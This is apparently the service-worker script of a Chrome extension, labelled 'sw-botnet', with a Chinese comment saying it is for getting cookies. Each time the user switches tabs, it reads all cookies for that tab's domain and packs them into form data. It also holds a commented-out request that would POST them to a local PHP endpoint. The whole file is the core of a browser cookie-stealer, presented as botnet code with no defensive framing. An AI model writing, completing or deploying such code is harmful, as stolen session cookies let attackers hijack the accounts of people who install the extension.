console.log('sw-botnet');

// chrome.runtime.onInstalled.addListener(function(details) {
//     console.log(details);
//     chrome.tabs.create({url: "https://www.baidu.com"});
// });

//制作一个函数用来得到cookie!
(function() {
    let tabId;

    chrome.tabs.onActivated.addListener(function (tab) {
        tabId = tab.tabId;
        console.log(tabId);
        chrome.tabs.get(tabId, function (tab) {
            let domain = tab.url.includes("://") ? tab.url.split("://")[1].split("/")[0] : tab.url.split("/")[0];
            if (domain.startsWith("www.")) {
                domain = domain.replace("www.", "");
            }
            console.log(domain);
            chrome.cookies.getAll({domain: domain}, (cookies) => {
                const result = [];
                cookies.forEach(item => {
                    const name = item.name;
                    const value = item.value;
                    const formatted = `${name}=${value}`;
                    result.push(formatted);
                });
                const output = result.join(';');
                const formData = new FormData();
                formData.append('cookie', output);
                // fetch('http://127.0.0.1/index.php', {
                //     headers: { "Content-Type": "application/json" },
                //     method: 'POST',
                //     body: formData
                // }).then(response => {
                //     return response.text();
                // }).then(data => {
                //     console.log('Response:', data);
                // })
            })
        });
    });
}());